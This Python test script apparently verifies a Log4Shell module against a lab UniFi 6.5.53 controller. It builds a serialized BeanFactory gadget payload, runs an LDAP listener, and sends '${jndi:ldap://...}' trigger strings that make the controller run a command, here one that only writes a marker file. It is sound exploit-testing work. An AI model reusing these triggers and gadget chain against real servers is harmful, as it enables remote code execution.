"""Verify real controller setup, native LDAP callbacks and harmless BeanFactory execution."""
import hashlib
import json
import os
from pathlib import Path
import subprocess
import time

from native_client import NativeUnifi
from native_oracle import PORT

runtime=json.loads(Path(os.environ['MODULE_TARGET_RUNTIME']).read_text())
client=NativeUnifi(runtime);artifacts=client.artifacts;proof={};process=None
try:
    expected_version=os.environ.get('UNIFI_VERSION','6.5.53')
    status=client.request('/status');assert status['status']==200
    status=json.loads(status['body']);assert status['meta']['up'] is True and status['meta']['server_version']==expected_version
    identities=client.identities();jvm=next(row for row in identities if row['kind']=='jvm');assert not any(row['kind']=='observer_error' for row in identities)
    assert jvm['java_version'].startswith('1.8.') and jvm['url_codebase'] is None and jvm['serial_data'] is None
    catalog=next(row for row in json.loads(Path(__file__).with_name('vendor.json').read_text()) if row['version']==expected_version)
    native_hashes=client.command('target','sha256sum',*['/usr/lib/unifi/lib/'+Path(row['path']).name for row in catalog['jars']])
    assert all(row['sha256']+'  /usr/lib/unifi/lib/'+Path(row['path']).name in native_hashes for row in catalog['jars'])
    before_pid=client.command('target','cat','/proc/'+jvm['pid']+'/stat')
    client.setup()
    accounts=client.mongo('db.admin.find({},{name:1,email:1}).toArray()')
    command='printf \'unifi-native:%s\\n\' "$PPID" > /tmp/module-target-unifi-native-proof'
    marker='/tmp/module-target-unifi-native-proof'
    client.command('target','test','!','-e',marker)
    client.command('target','java','-Xms16m','-Xmx48m','-XX:+UseSerialGC','-XX:ActiveProcessorCount=1','-cp','/opt/module-target:/usr/lib/unifi/lib/*','NativeBeanFactory',command,'/unifi/proofs/native-resource-ref.bin')
    native_hash=client.command('target','sha256sum','/unifi/proofs/native-resource-ref.bin').split()[0]
    transfer=subprocess.run(runtime['compose']+['exec','-T','target','cat','/unifi/proofs/native-resource-ref.bin'],capture_output=True,timeout=20);assert transfer.returncode==0
    payload=transfer.stdout;assert payload.startswith(bytes.fromhex('aced0005')) and hashlib.sha256(payload).hexdigest()==native_hash
    (artifacts/'native-resource-ref.bin').write_bytes(payload)
    log=(artifacts/'native-oracle-process.log').open('w')
    process=subprocess.Popen(runtime['compose']+['exec','-T','framework','python3','-u','test/module_targets/unifi_log4shell/native_oracle.py',str(artifacts)],stdin=subprocess.DEVNULL,stdout=log,stderr=subprocess.STDOUT)
    deadline=time.monotonic()+15
    while not (artifacts/'native-oracle-ready.json').exists():
        assert process.poll() is None,'Native oracle terminated before startup'
        if time.monotonic()>deadline:raise TimeoutError('Native oracle startup')
        time.sleep(0.05)
    client.trigger('module-target-benign-remember')
    events=[json.loads(line) for line in (artifacts/'native-oracle-events.jsonl').read_text().splitlines()];assert not any(row['kind']=='ldap' for row in events)
    client.trigger('${jndi:ldap://'+runtime['listener_host']+':'+str(PORT)+'/cn=observe}')
    client.command('target','test','!','-e',marker)
    client.trigger('${jndi:ldap://'+runtime['listener_host']+':'+str(PORT)+'/cn=execute}')
    output=client.command('target','sh','-c','if test -f "$1"; then cat "$1"; fi','native',marker)
    vulnerable=expected_version=='6.5.53'
    assert output==('unifi-native:'+jvm['pid']+'\n' if vulnerable else ''),(expected_version,output)
    if vulnerable:assert client.command('target','stat','-c','%u',marker).strip()=='0'
    events=[json.loads(line) for line in (artifacts/'native-oracle-events.jsonl').read_text().splitlines()]
    searches=[row for row in events if row['kind']=='ldap' and row['operation']==99]
    assert bool(searches)==vulnerable
    if vulnerable:assert {row['base_dn'] for row in searches}=={'cn=observe','cn=execute'}
    assert not any(row['kind'] in ['oracle_error','oracle_timeout'] for row in events),events
    assert all(row['payload_sha256']==native_hash for row in searches if 'payload_sha256' in row)
    client.command('target','rm','-f','--',marker)
    client.command('target','test','!','-e',marker)
    after=client.identities();assert not any(row['kind']=='observer_error' for row in after)
    for row in after:
        if row['kind']!='class':continue
        owner=next(item for item in catalog['jars'] if row['name']+'.class' in item['relevant_classes'])
        assert row['source']=='file:/usr/lib/unifi/lib/'+Path(owner['path']).name
        assert row['jar_sha256']==owner['sha256'] and row['class_sha256']==owner['relevant_classes'][row['name']+'.class']
    if vulnerable:
        assert {row['name'] for row in after if row['kind']=='class'}=={'org/apache/logging/log4j/core/lookup/JndiLookup','org/apache/naming/ResourceRef','org/apache/naming/factory/BeanFactory','javax/el/ELProcessor'}
    assert client.mongo('db.admin.find({},{name:1,email:1}).toArray()')==accounts
    after_pid=client.command('target','cat','/proc/'+jvm['pid']+'/stat');assert before_pid.split(') ',1)[1].split()[19]==after_pid.split(') ',1)[1].split()[19]
    for service in ['target','framework','reporting_db']:
        memory=client.command(service,'cat','/sys/fs/cgroup/memory.events');assert 'oom 0\n' in memory and 'oom_kill 0\n' in memory
        assert client.command(service,'cat','/sys/fs/cgroup/pids.events').strip()=='max 0'
    proof=dict(version=expected_version,status=status,jvm=jvm,identities=after,accounts=accounts,marker=output,searches=searches,payload_sha256=native_hash)
finally:
    if process is not None:
        (artifacts/'native-oracle-stop').write_text('stop\n')
        try:exitstatus=process.wait(timeout=15)
        except subprocess.TimeoutExpired:
            process.terminate();exitstatus=process.wait(timeout=10)
        log.close();proof['oracle_exitstatus']=exitstatus
    client.write(proof)
assert proof['oracle_exitstatus']==0
print(json.dumps(proof))
